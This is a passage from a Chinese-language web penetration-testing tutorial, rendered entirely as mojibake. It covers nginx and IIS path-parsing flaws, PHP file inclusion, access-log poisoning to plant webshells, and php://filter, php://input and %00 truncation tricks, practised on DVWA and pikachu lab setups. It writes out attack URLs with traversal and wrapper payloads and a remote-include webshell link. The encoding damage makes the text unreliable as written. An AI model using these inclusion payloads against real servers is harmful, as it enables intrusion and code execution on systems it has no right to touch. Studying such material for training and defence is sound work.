ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œnginxä¼šç›´æ¥è¿”å›é”™è¯¯ä¿¡æ¯ï¼Œè¯´æ‰¾ä¸åˆ°è¯¥æ–‡ä»¶ï¼Œä½†æ˜¯å¦‚æœnginx.confé…ç½®ä¸å½“ä¼šå¯¼è‡´nginxæŠŠä»¥â€™.phpâ€™ç»“å°¾çš„æ–‡ä»¶äº¤ç»™fastcgiå¤„ç†ï¼Œä¹Ÿå°±æ˜¯è¯´é¦–å…ˆnginxçœ‹åˆ°ä½ è·¯å¾„ä¸­è¦æ‰¾aaa.phpï¼Œå“¦ï¼ŒåŸæ¥æ˜¯phpæ–‡ä»¶ï¼Œnginxä¸å»æ‰¾è¿™ä¸ªæ–‡ä»¶äº†ï¼Œè€Œæ˜¯å°±ç›´æ¥äº¤ç»™äº†fastcgiï¼Œfastcgiåˆå»æ‰¾phpè§£é‡Šå™¨å»å¤„ç†è¯¥è·¯å¾„ï¼Œè€Œphpå¼€å¯äº†cgi.fix_pathinfoï¼Œé‚£ä¹ˆphpè§£é‡Šå™¨å¤„ç†è¿™ä¸ªè·¯å¾„çš„æ—¶å€™ï¼Œå‘ç°æ²¡æœ‰aaa.phpæ–‡ä»¶ï¼Œé‚£ä¹ˆä»–ä¼šæ‰¾è·¯å¾„ä¸­ä¸Šä¸€å±‚è·¯å¾„çš„æ–‡ä»¶ä½œä¸ºaaa.phpæ¥è¿è¡Œï¼Œå¦‚æ˜¯ä¹å°±æ‰¾åˆ°äº†web.jpgï¼Œå°†web.jpgå½“ä½œaaa.phpæ¥è¿è¡Œäº†ï¼Œæ‰€ä»¥ä»£ç è¢«æ‰§è¡Œï¼Œçœ‹åˆ°å¦‚ä¸‹æ•ˆæœ ç¤ºä¾‹ï¼šæˆ‘ä»¬é€šè¿‡phpstudyæ¥æ”¹æˆnginxè¿è¡Œ fix_pathinfoè¿™ä¸ªåŠŸèƒ½å‚æ•°é»˜è®¤æ˜¯å¼€å¯çš„ï¼Œæ‰€ä»¥è¿™ä¸ªæ¼æ´å½±å“ä¹Ÿæ˜¯æ¯”è¾ƒå¤§çš„ï¼Œæˆ‘ä»¬è®¿é—®ä¸€ä¸‹phpinfo.phpæ–‡ä»¶ï¼Œçœ‹çœ‹è¿™ä¸ªåŠŸèƒ½æ˜¯å¦å¼€å¯äº†ã€‚ æ¯”å¦‚æˆ‘å°†ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶ï¼Œæ”¹ä¸º.jpgæ–‡ä»¶ï¼Œæ”¾åˆ°pikachuçš„æ–‡ä»¶å¤¹ä¸‹ ç„¶åé€šè¿‡æµè§ˆå™¨æ¥è®¿é—®ä¸€ä¸‹ èƒ½çœ‹å‡ºï¼Œé»˜è®¤æ˜¯ä¸èƒ½è®¿é—®çš„ï¼Œæˆ‘ä»¬åªè¦åœ¨è·¯å¾„åé¢åŠ ä¸Šä¸€ä¸ª tu.php ï¼Œå°±èƒ½å¤ŸæŒ‰ç…§phpæ¥è§£æäº†ï¼Œç›´æ¥å°±æ˜¯æ¼æ´ã€‚å› ä¸ºå›¾ç‰‡æˆ‘ä»¬æ˜¯æ­£å¸¸èƒ½å¤Ÿä¸Šä¼ çš„ï¼Œä¸Šä¼ è¿‡å»ä¹‹åï¼Œå¦‚æœæ˜¯nginxæ¥è§£æçš„ï¼Œå¹¶ä¸”å¼€å¯äº†cgi.fix_pathinfoåŠŸèƒ½ï¼Œé‚£ä¹ˆåŸºæœ¬ä¸Šå±äºè¢«ä½ æ‹¿ä¸‹äº†ã€‚ å…¶ä»–æ¼æ´å½¢å¼ www.xxxx.com/UploadFiles/image/1.jpg/1.phpï¼Œè¿™æ˜¯ä¸Šé¢è¯´çš„æ¼æ´ www.xxxx.com/UploadFiles/image/1.jpg%00.php #æˆ‘ä»¬è¯•è¿‡è¿™ä¸ª00æˆªæ–­ï¼Œé™¤äº†apacheä¹‹å¤–ï¼Œnginxä¹Ÿæœ‰è¿™ä¸ª00æˆªæ–­æ¼æ´,è¿™ä¸ªå¯¼è‡´çš„æ•ˆæœæ˜¯ï¼š1.jpgä¼šè¢«å½“æˆphpæ–‡ä»¶æ¥è§£æã€‚ www.xxxx.com/UploadFiles/image/1.jpg/%20\\0.php #ä¹Ÿç®—æ˜¯00æˆªæ–­çš„ä¸€ç§ xxx.jpg%00.php (Nginx 0.8.03ç‰ˆæœ¬ å­˜åœ¨ç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´) **ä¿®å¤æ–¹æ¡ˆ** 1.ä¿®æ”¹php.iniæ–‡ä»¶ï¼Œå°†cgi.fix_pathinfoçš„å€¼è®¾ç½®ä¸º0; 2.åœ¨Nginxé…ç½®æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š if ( $fastcgi_script_name ~ ..*.*php ) { return 403; } è¿™è¡Œä»£ç çš„æ„æ€æ˜¯å½“åŒ¹é…åˆ°ç±»ä¼¼test.jpga.phpçš„URLæ—¶ï¼Œå°†è¿”å›403é”™è¯¯ä»£ç ã€‚ 9-4-5 IIS7.xè§£ææ¼æ´IIS7.5çš„æ¼æ´ä¸nginxçš„ç±»ä¼¼ï¼Œéƒ½æ˜¯ç”±äºphpé…ç½®æ–‡ä»¶(php.iniæ–‡ä»¶)ä¸­ï¼Œå¼€å¯äº†cgi.fix_pathinfoï¼Œè€Œè¿™å¹¶ä¸æ˜¯nginxæˆ–è€…iis7.5æœ¬èº«çš„æ¼æ´ï¼Œéƒ½æ˜¯é…ç½®ä¸å½“å¼•èµ·çš„ã€‚ https://www.xp.cn/a.php/182.html å½“å®‰è£…å®Œæˆåï¼Œ php.inié‡Œé»˜è®¤cgi.fix_pathinfo1ï¼Œå¯¹å…¶è¿›è¡Œè®¿é—®çš„æ—¶å€™ï¼Œåœ¨URLè·¯å¾„åæ·»åŠ .phpåç¼€åä¼šå½“åšphpæ–‡ä»¶è¿›è¡Œè§£æï¼Œæ¼æ´ç”±æ­¤äº§ç”Ÿ php.iniæ–‡ä»¶é…ç½® è™½ç„¶é€šè¿‡é…ç½®ä¸Šçœ‹ï¼Œæˆ‘ä»¬å‘ç°æ˜¯æœ‰è¿™ä¸ªæ¼æ´çš„ï¼Œä½†æ˜¯å®é™…æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå¹¶ä¸æ˜¯é‚£ä¹ˆç®€å•ï¼Œå¦‚ä¸‹ï¼Œæ³¨æ„ï¼Œä¸‹é¢çš„ç¤ºä¾‹æ˜¯ç”¨çš„phpstudy2016ç‰ˆæœ¬æ¥æ¼”ç¤ºçš„ï¼Œwin7åŠä»¥ä¸Šçš„ç³»ç»Ÿæ‰è¡Œæ˜‚ï¼Œwin2003ä¸è¡Œçš„ï¼Œå‹¾é€‰iisçš„æ—¶å€™ï¼Œå¯èƒ½ä¼šæç¤ºä½ ï¼Œè¯´ä½ æ²¡æœ‰å°šæœªå®‰è£…iis 78ï¼Œå¤§å®¶è‡ªè¡Œå®‰è£…ä¸€ä¸‹å³å¯ã€‚æŒ‰ç…§è¿™ä¸ªphpstudyçš„å®˜ç½‘æ¥å®‰è£…ï¼šhttps://www.xp.cn/a.php/182.htmlï¼Œå…¶ä¸­è¦æ¿€æ´»CGIåŠŸèƒ½ï¼Œåˆ«å¿˜äº†ã€‚ ä½ çš„phpstudyå¯èƒ½ä¼šæŠ¥é”™ è§£å†³æ–¹æ³•ï¼šå®‰è£…vc9å·¥å…· æ”¾åˆ°æˆ‘ä»¬çš„win7è™šæ‹Ÿæœºä¸Š å®‰è£… ä¸€ä¼šå°±æç¤ºä½ å®‰è£…å¥½äº†ï¼Œåœ¨é‡å¯phpstudyå³å¯ã€‚å¦‚æœæç¤ºä½ ç½‘ç«™è¿è¡Œç«¯å£å†²çªäº†ï¼Œæˆ‘ä»¬æ”¹ä¸ªç«¯å£å³å¯ æŒ‰ç…§æ–‡æ¡£çš„å®‰è£…å’Œé…ç½®ï¼Œæˆ‘ä»¬è®¿é—®æˆ‘ä»¬çš„iisç½‘ç«™ä¸‹é¢çš„å›¾ç‰‡æ—¶ æ ¹æ®iisçš„è§£ææ¼æ´æ–¹å¼æ¥å†™å¦‚ä¸‹è®¿é—®ç½‘å€ï¼š è¿˜æ˜¯æŠ¥é”™äº†ï¼Œè¦è¿›è¡Œå¦‚ä¸‹é…ç½®æ‰èƒ½çœ‹åˆ°æ•ˆæœã€‚ æ‰¾åˆ°ç½‘ç«™ä»£ç å­˜æ”¾ç›®å½•ï¼Œæ¥éƒ¨ç½²ç½‘ç«™ï¼š æ³¨ï¼šåœ¨è¿›è¡Œå®é™…çš„æµ‹è¯•çš„æ—¶å€™ï¼Œiiså¹¶ä¸åƒnginxä¼¼çš„ç›´æ¥å¯ä»¥åˆ©ç”¨ï¼Œå‘ç°æ¼æ´å¹¶æ²¡æœ‰äº§ç”Ÿï¼Œåæ¥å‘ç°è¦å°†FastCGIçš„è°ƒç”¨æƒ…å†µå–æ¶ˆé™åˆ¶ï¼Œå¦‚ä¸‹ï¼Œå°†å¯¹å‹¾å»æ‰ã€‚ æ•ˆæœå¦‚ä¸‹ æ‰€ä»¥ä½ ä¼šå‘ç°ï¼Œè¿™ä¸ªæ¼æ´å¦‚æœæƒ³ç”¨çš„è¯ï¼Œé«˜ç‰ˆæœ¬éœ€è¦è¿›è¡Œå¾ˆå¤šçš„é…ç½®ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸ä¼šå‡ºç°è¿™ä¸ªæ¼æ´ã€‚ 9-4-6 æ–‡ä»¶åŒ…å«æ¼æ´6-1 PHPåŒ…å«æ¼æ´åˆ†ç±»åŒ…å«æ¼æ´ä¸æ˜¯è¯­è¨€çš„é—®é¢˜ï¼Œè€Œæ˜¯äººçš„æ€ç»´é—®é¢˜! PHPä¸­çš„å››ä¸ªåŒ…å«æ–‡ä»¶å‡½æ•°include(),include_once(),require()å’Œrequire_once()ã€‚Includeç”¨çš„æ¯”è¾ƒå¤šã€‚ requireä¸€ä¸ªæ–‡ä»¶å­˜åœ¨é”™è¯¯çš„è¯ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šä¸­æ–­æ‰§è¡Œäº†ï¼Œå¹¶æ˜¾ç¤ºè‡´å‘½é”™è¯¯ includeä¸€ä¸ªæ–‡ä»¶å­˜åœ¨é”™è¯¯çš„è¯ï¼Œé‚£ä¹ˆç¨‹åºä¸ä¼šä¸­ç«¯ï¼Œè€Œæ˜¯ç»§ç»­æ‰§è¡Œï¼Œå¹¶æ˜¾ç¤ºä¸€ä¸ªè­¦å‘Šé”™è¯¯ã€‚ include_once()ï¼Œrequire_once()ä¼šå…ˆæ£€æŸ¥ç›®æ ‡æ–‡ä»¶çš„å†…å®¹æ˜¯ä¸æ˜¯åœ¨ä¹‹å‰å°±å·²ç»å¯¼å…¥è¿‡äº†ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œä¾¿ä¸ä¼šå†æ¬¡é‡å¤å¯¼å…¥åŒæ ·çš„å†…å®¹ã€‚ ä¸‹é¢æˆ‘ä»¬ä¸€èµ·æ¥çœ‹PHPæ–‡ä»¶ä¸­çš„åŒ…å«ã€‚ 1ã€æœ¬åœ°åŒ…å« LIFï¼Œè¿™ä¸ªæ¯”è¾ƒå¥½åˆ©ç”¨ 2ã€è¿œç¨‹åŒ…å« RLFï¼Œéœ€è¦å¼€å¯è¿™ä¸¤ä¸ªåŠŸèƒ½ï¼šallow_url_includeonå¹¶ä¸”magic_quotes_gpcoff 6-2 PHPæœ¬åœ°åŒ…å«ç¤ºä¾‹ç¤ºä¾‹ï¼šhttp://192,168.18.16/123.php?filename=1.php] æ¯”å¦‚æˆ‘ä»¬åœ¨phpstudyçš„wwwç›®å½•ä¸‹åˆ›å»ºå¦‚ä¸‹æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ ç„¶åæˆ‘ä»¬æ¯”å¦‚æœ‰ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶åœ¨è¿™é‡Œé¢ ç„¶åæµè§ˆå™¨ä¸­æˆ‘ä»¬è®¿é—®è¿™ä¸ª123.phpæ–‡ä»¶ ç„¶åå‘ç°ï¼Œæœ¨é©¬æ–‡ä»¶è¢«åˆ©ç”¨äº†ï¼Œæˆ‘ä»¬åšä»£ç å®¡è®¡çš„æ—¶å€™ï¼Œå¦‚æœå‘ç°æœ‰ä½¿ç”¨åˆ°æˆ‘ä»¬ä¸Šé¢è¯´åˆ°çš„å››ä¸ªæ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ£€æµ‹ä¸€ä¸‹å®ƒçš„æ¼æ´ï¼Œå¦‚æœå’Œæˆ‘ä»¬å†™çš„ä»£ç ä¼¼çš„ï¼Œç›´æ¥å¼•å…¥æŸä¸ªç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™å°±æ˜¯æœ¬åœ°åŒ…å«æ¼æ´ã€‚ç›¸å¯¹è·¯å¾„ä¹Ÿå¯ä»¥ 6-3 PHPè¿œç¨‹åŒ…å«å®ä¾‹allow_url_includeoffè¿™è¡Œ,æŠŠoffæ”¹æˆonï¼Œé­”æœ¯ç¬¦å·å…³é—­ï¼Œè¿™ä¸¤ä¸ªæ¡ä»¶è®¾ç½®ä¸€ä¸‹ http://192.168.18.16/webshell.jpg æ•ˆæœï¼š 6-4 åŒ…å«æ¼æ´ä¸Šä¼ æŠ€å·§ä¸€èˆ¬é‡‡ç”¨ä¸€å¥è¯æœ¨é©¬ä¸å›¾ç‰‡ç»‘å®šï¼Œè¿™ä¸ªè®²è¿‡äº†ã€‚ 6-5 åŒ…å«æ—¥å¿—æ–‡ä»¶å½“æŸä¸ªPHPæ–‡ä»¶å­˜åœ¨æœ¬åœ°åŒ…å«æ¼æ´ï¼Œè€Œå´æ— æ³•ä¸Šä¼ æ­£å¸¸æ–‡ä»¶ï¼Œè¿™å°±æ„å‘³ç€æœ‰åŒ…å«æ¼æ´å´ä¸èƒ½æ‹¿æ¥åˆ©ç”¨ï¼Œè¿™æ—¶æ”»å‡»è€…å°±æœ‰å¯èƒ½ä¼šåˆ©ç”¨apacheæ—¥å¿—æ–‡ä»¶æ¥å…¥ä¾µã€‚ ApacheæœåŠ¡å™¨è¿è¡Œåä¼šç”Ÿæˆä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶æ˜¯access.log(è®¿é—®æ—¥å¿—)å’Œerror.log(é”™è¯¯æ—¥å¿—)ï¼Œapacheçš„æ—¥å¿—æ–‡ä»¶è®°å½•ä¸‹æˆ‘ä»¬çš„æ“ä½œï¼Œå¹¶ä¸”å†™åˆ°è®¿é—®æ—¥å¿—æ–‡ä»¶access.logä¹‹ä¸­ C:\\phpStudy\\PHPTutorial\\Apache\\logs\\access.log # varlognginxaccess.log C:\\phpStudy\\PHPTutorial\\WWW\\DVWA\\vulnerabilities\\fi\\index.php ........Apachelogsaccess.log ä¾‹å¦‚:http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=../../../../Apache-20\\logs\\access.log ç¤ºä¾‹ï¼š é¦–å…ˆå¼€å¯æ—¥å¿—è®°å½•åŠŸèƒ½ æ‰¾åˆ°httpd-confï¼Œç„¶åæ‰“å¼€ï¼Œåœ¨é…ç½®ä¸­ä¿®æ”¹æ—¥å¿—å¼€å¯çŠ¶æ€ ç„¶åé‡å¯phpstudyå³å¯ çœ‹åˆ°äº†access.logæ–‡ä»¶ï¼Œè¿™ä¸ªæ—¥å¿—è®°å½•æ–‡ä»¶åœ¨å·¥ä½œä¸­éƒ½æ˜¯è¦å¼€å¯çš„ï¼Œé¦–å…ˆç°åœ¨å›½å®¶å®‰å…¨æ³•é‡Œé¢è§„å®šè¦è¿›è¡Œæ—¥å¿—è®°å½•ï¼Œå†æœ‰å°±æ˜¯ä¼ä¸šå¯ä»¥é€šè¿‡æ—¥å¿—è®°å½•å¿«é€Ÿçš„æ’æŸ¥é—®é¢˜å‡ºç°åœ¨å“ªé‡Œï¼Œæ–¹ä¾¿å·¥ä½œï¼Œè™½ç„¶é»˜è®¤é…ç½®ä¸­æ²¡æœ‰å¼€å¯æ—¥å¿—è®°å½•ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸€å®šè¦å¼€ã€‚ æ¯”å¦‚æˆ‘ä»¬åˆ·æ–°ä¸€ä¸‹åˆšæ‰çš„è¯·æ±‚ ç„¶åæ‰“å¼€access.logæ–‡ä»¶ï¼Œçœ‹æ—¥å¿— ä»»ä½•è®¿é—®éƒ½è¢«è®°å½•ä¸‹æ¥äº†ã€‚é‚£ä¹ˆé’ˆå¯¹æ—¥å¿—è®°å½•æ ¼å¼ï¼Œå…¶å®åœ¨é…ç½®æ–‡ä»¶ä¸­ä¹Ÿå¯ä»¥ä¿®æ”¹çš„ å¥½ï¼Œæ—¥å¿—è®°å½•å¼€å¯ä¹‹åï¼Œæˆ‘ä»¬ç»§ç»­æ¥çœ‹æˆ‘ä»¬çš„æ—¥å¿—æ–‡ä»¶åŒ…å«æ¼æ´ æˆ‘ä»¬å¯ä»¥å…ˆç”¨ æ¥æµ‹è¯•ä¸€ä¸‹ã€‚ çœ‹åˆ°æ—¥å¿—å¦‚ä¸‹ï¼Œè¢«urlç¼–ç äº† æˆ‘ä»¬é€šè¿‡åŒ…å«æ—¥å¿—çš„æ–¹å¼åœ¨æµè§ˆå™¨ä¸Šè®¿é—®ä¸€ä¸‹ å‘ç°ä»£ç å¹¶æ²¡æœ‰æ‰§è¡Œï¼Œè¿™æ˜¯å› ä¸ºurlç¼–ç ä¹‹åä¿å­˜åœ¨æ—¥å¿—ä¸­çš„ä»£ç æ˜¯ä¸èƒ½è¢«æ‰§è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å‘é€è¿‡å»çš„ä»£ç ä¸è¦è¿›è¡Œurlç¼–ç ï¼Œä½†æ˜¯urlç¼–ç æ˜¯æµè§ˆå™¨çš„è‡ªåŠ¨è¡Œä¸ºï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡æŠ“åŒ…æ¥è¿›è¡Œä¿®æ”¹ å†æ”¾åŒ…è¿‡å»ï¼Œçœ‹æ—¥å¿—ï¼Œå°±æ²¡æœ‰è¢«urlç¼–ç  æ­¤æ—¶æµè§ˆå™¨å†è®¿é—®ï¼Œæ•ˆæœå¦‚ä¸‹ï¼Œä»£ç è¢«æ‰§è¡Œäº†ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥æ‰¾ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ ## é€šè¿‡åå°ç›®å½•åˆ†æï¼Œå‘ç°ç›®å½•å±‚çº§å…³ç³»å¦‚ä¸‹ï¼š C:\\phpStudy\\PHPTutorial\\Apache\\logs\\access.log C:\\phpStudy\\PHPTutorial\\WWW\\DVWA\\vulnerabilities\\fi\\index.html ## æ‰€ä»¥å¯ä»¥é€šè¿‡..æ¥æ‰¾åˆ°æ—¥å¿—ï¼š http://192.168.31.172/dvwa/vulnerabilities/fi/?page=../../../../Apache/logs/access.log ç„¶åé€šè¿‡æµè§ˆå™¨è®¿é—®ä¸€ä¸‹ ç„¶åçœ‹æ—¥å¿— æ”»å‡»ä»£ç è¢«è®°å½•äº†ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡ç›¸å¯¹è·¯å¾„æ¥æ‰¾åˆ°access.logæ–‡ä»¶ ç„¶åæœ‰çš„æ—¶å€™ï¼Œæˆ‘ä»¬é€šè¿‡èœåˆ€å°±èƒ½æ‰§è¡Œå®ƒäº†ï¼Œä½†æ˜¯æœ‰æ—¶å€™å¯èƒ½ä¸è¡Œæ˜‚ï¼Œæœ‰äº›ç¼–ç æ•°æ®å¯èƒ½èœåˆ€ä¸èƒ½è¯†åˆ«å‡ºæ¥ï¼Œæˆ‘ä»¬è¯•ä¸€ä¸‹ ç„¶åæ·»åŠ ï¼ŒåŒå‡»è¿›è¡Œè¿æ¥ï¼Œç›´æ¥æ‹¿ä¸‹äº†ç³»ç»Ÿ å¦‚æœå‘ç°è¿˜æ˜¯è¿æ¥ä¸ä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ¢ä¸€ç§æ–¹å¼ï¼Œé€šè¿‡æ—¥å¿—æ–‡ä»¶ä¸“é—¨å»ç”Ÿæˆä¸€ä¸ªä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ â€˜);? æŠ“åŒ…ç„¶ååŠ ä¸Šä¸Šé¢çš„ä»£ç ï¼Œå¦‚ä¸‹ æ”¾åŒ…è¿‡å»ï¼Œå°±çœ‹åˆ°æ—¥å¿—æ–‡ä»¶ä¸­çš„è®°å½•å¦‚ä¸‹ æµè§ˆå™¨é€šè¿‡åŒ…å«æ—¥å¿—çš„æ–¹å¼è®¿é—®ä¸€ä¸‹ å°±çœ‹åˆ°åœ¨fiç›®å½•ä¸‹ç”Ÿæˆäº†jaden.phpæ–‡ä»¶ï¼Œå¦‚ä¸‹ ç„¶åé€šè¿‡èšå‰‘è¿›è¡Œè¿æ¥å³å¯ è¿™å°±æ˜¯åŒ…å«æ—¥å¿—æ–‡ä»¶çš„æ¼æ´åˆ©ç”¨ï¼Œå½“ç„¶äº†å¦‚æœæœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„è¯ï¼Œæˆ‘ä»¬é€šè¿‡ä¸Šä¼ æ–‡ä»¶æºå¸¦æœ¨é©¬çš„æ‰‹æ®µä¹Ÿèƒ½ç©ï¼Œæ—¥å¿—è¿™ç§æ˜¯æ²¡æœ‰ä¸Šä¼ æ–‡ä»¶æ¼æ´çš„ç½‘ç«™çš„æ¼æ´åˆ©ç”¨æ–¹å¼ã€‚æ‰€ä»¥å­¦æ¸—é€é‡ç‚¹æ˜¯å­¦ä¹ æ€è·¯ã€‚é™¤äº†ä¸Šé¢ä¸¤ç§åˆ©ç”¨æ–¹å¼ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸‹é¢å‡ ä¸ªæ–¹å¼ï¼Œæˆ‘ä»¬ä¸€ä¸€æ¥å­¦ã€‚ 6-6 PHPåŒ…å«è¯»æ–‡ä»¶æ‰€è°“è¯»æ–‡ä»¶ï¼Œå°±æ˜¯æƒ³åŠæ³•è¯»å–æŸä¸ªç›®å½•ä¸­çš„æŸä¸ªæ–‡ä»¶å†…å®¹ http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php è®¿é—®URL,å¾—åˆ°ç»è¿‡base64åŠ å¯†åçš„å­—ç¬¦ä¸²: ç»è§£å¯†è¿˜åŸå¾—åˆ°å¦‚ä¸‹ï¼š ç¤ºä¾‹ï¼šè¿™é‡Œæˆ‘ä»¬ç”¨dvwaæ¥ç©ä¸€ç© æ‰¾åˆ°æ–‡ä»¶åŒ…å«æµ‹è¯• ç‚¹å‡»ä¸Šé¢çš„file1.phpï¼Œæ¥åˆ°å¦‚ä¸‹é¡µé¢ æ‰€ä»¥æˆ‘ä»¬å…¶å®å¯ä»¥æŒ‰ç…§å¼€å‘äººå‘˜çš„æ€è·¯æ¥æƒ³ï¼Œè¿™ä¸ªäººå¼€å‘çš„æ—¶å€™ï¼Œè¿™ä¸ªåŠŸèƒ½æ˜¯åœ¨å¹²ä»€ä¹ˆï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹æºç  è¿™ä¸ªä»£ç èƒ½çœ‹å‡ºï¼Œä»–æ²¡æœ‰å¯¹pageå‚æ•°åšä»»ä½•çš„è¿‡æ»¤å¤„ç†ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬æŠ“åŒ…æ¥ç©ä¸€ä¸‹ï¼Œå°†pageå‚æ•°çš„å€¼æ”¹ä¸ºå¦‚ä¸‹å†…å®¹ï¼š ç„¶åæˆ‘ä»¬å»dvwaçš„ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªx.phpæ–‡ä»¶ï¼Œå¦‚æœæƒ³è¯»å–å½“å‰ç›®å½•çš„ä¸Šä¸€å±‚ç›®å½•è¿˜å¯ä»¥è‡ªå·±åŠ  .. ï¼Œæ¯”å¦‚ï¼š http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=../x.phpæˆ‘ä»¬çœ‹çœ‹ç›®å‰çš„æ•ˆæœï¼šä¹‹æ‰€ä»¥è¦èµ°base64ç¼–ç ï¼Œæ˜¯å› ä¸ºï¼Œå¦‚æœä¸å°†è¯»å–å‡ºæ¥çš„æ•°æ®è¿›è¡Œç¼–ç çš„è¯ï¼Œé‚£ä¹ˆ å¦‚æœä½ è¯»å–çš„æ–‡ä»¶æ˜¯phpä»£ç ï¼Œé‚£ä¹ˆå®ƒä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œæ‰€ä»¥çœ‹ä¸åˆ°æ–‡ä»¶ä»£ç æ•°æ®ï¼Œå¦‚æœä½ æ˜¯å…¶ä»–æ•°æ®ï¼Œä¸æ˜¯phpä»£ç ï¼Œé‚£ä¹ˆå¾ˆæœ‰å¯èƒ½æŠ¥é”™ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†è¯»å–å‡ºæ¥çš„æ•°æ®ç¼–ç ä¸€ä¸‹è¿›è¡Œæ˜¾ç¤º ç„¶åé€šè¿‡burpçš„ç¼–ç å™¨æ¥è§£ç ä¸€ä¸‹ï¼Œçœ‹æ•ˆæœï¼š æ­£æ˜¯æˆ‘ä»¬å†™çš„x.phpæ–‡ä»¶é‡Œé¢çš„å†…å®¹ã€‚ æ–‡ä»¶åŒ…å«æ¼æ´å…¶å®éå¸¸å¼ºå¤§ï¼Œèƒ½åšå¾ˆå¤šçš„äº‹æƒ…ï¼Œåªè¦ä½ è¿‡æ»¤æ²¡åšå¥½ï¼Œé‚£ä¹ˆå°±å­˜åœ¨è¿™ç§æ¼æ´ï¼Œç°åœ¨å¾ˆå¤šç«™ç‚¹è¿˜æœ‰è¿™ç§æ¼æ´ã€‚ 6-7 PHPåŒ…å«å‘½ä»¤æ‰§è¡Œå†™å…¥æ–‡ä»¶å†…å®¹ï¼Œåšå‘½ä»¤æ‰§è¡ŒåŠ¨ä½œï¼Œè¿™ç§æ¼æ´å±äºé«˜å±æ¼æ´ã€‚ æ„é€ URL: http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://input,å¹¶ä¸”æäº¤è¯·æ±‚ä½“æ•°æ®ä¸º: ## è¿™å¥è¯æ˜¯åˆ©ç”¨phpä»£ç æ¥æ‰§è¡Œæ“ä½œç³»ç»ŸæŒ‡ä»¤ï¼Œå…¶å®ä½ æ‰§è¡Œä»€ä¹ˆä»£ç éƒ½å¯ä»¥,æ¯”å¦‚ æ³¨æ„:åªæœ‰åœ¨allow _url_includeä¸ºonçš„æ—¶å€™æ‰å¯ä»¥ä½¿ç”¨ã€‚ ç¤ºä¾‹ï¼š æ¯”å¦‚è¿˜æ˜¯ä¸Šä¸€ä¸ªè¯·æ±‚åŒ…ï¼Œæˆ‘ä»¬æ”¹åŠ¨ä¸€ä¸‹ å¦‚æœå®éªŒåšä¸å‡ºæ¥æ•ˆæœï¼Œé‚£ä¹ˆå°±é‡å¯ä¸€ä¸‹phpstudyå’Œburpã€‚ 6-8 åŒ…å«æˆªæ–­ç»•è¿‡ å¯¹äºè€æ‰‹ç¨‹åºå‘˜ï¼Œå¼€å‘å‡ºæ¥çš„ä»£ç å¯èƒ½ä¼šåšä¸€äº›å®‰å…¨é™åˆ¶ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ç§ä»£ç  http://192.168.18.16/123.php?page=x.php è¿™ç§æ–¹æ³•åªé€‚åˆäºmagic_quotes_gpcoffçš„æ—¶å€™ï¼Œ phpç‰ˆæœ¬å°äº5.3.4ï¼Œå¯é€šè¿‡%00æˆªæ–­ç»•è¿‡ï¼Œä¸è¿‡ç°åœ¨å·²ç»å¾ˆéš¾è§åˆ°äº†ã€‚ ç¤ºä¾‹ï¼šæ¯”å¦‚è¿˜æ˜¯æˆ‘ä»¬çš„123.phpæ–‡ä»¶ï¼Œæ”¹åŠ¨ä¸ºä¸Šé¢çš„ä»£ç  å¹¶ä¸”æ³¨æ„è¿™é‡Œé¢æœ‰ä¸ªwebshell.jpgæ–‡ä»¶ï¼Œæ¯”å¦‚è¿™ä¸ªæ–‡ä»¶æ˜¯æˆ‘ä»¬ä¸Šä¼ ä¸Šå»çš„ï¼Œæˆ‘ç°åœ¨æƒ³æ‰§è¡Œä»¥ä¸‹å®ƒï¼Œäºæ˜¯æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸Šè®¿é—®äº†ä¸€ä¸‹ å‘ç°æŠ¥é”™äº†ï¼Œå¹¶ä¸”è‡ªåŠ¨åœ¨ä½ æŒ‡å®šçš„å‚æ•°å€¼åé¢åŠ ä¸Šäº†.phpåç¼€ï¼Œå¯¼è‡´æˆ‘ä»¬æ— æ³•è®¿é—®åˆ°webshell.jpgæ–‡ä»¶ï¼Œé‚£ä¹ˆæ€ä¹ˆæå‘¢ï¼Ÿé€šè¿‡%00æˆªæ–­ï¼Œç›´æ¥å°†ä½ ä»£ç åé¢æ·»åŠ çš„.phpç»™å¹²æ‰äº†ã€‚æ³¨æ„äº†ï¼Œè¿™ä¸ªå’ŒwebæœåŠ¡ç¨‹åºçš„%00æˆªæ–­ä¸å¤ªä¸€æ 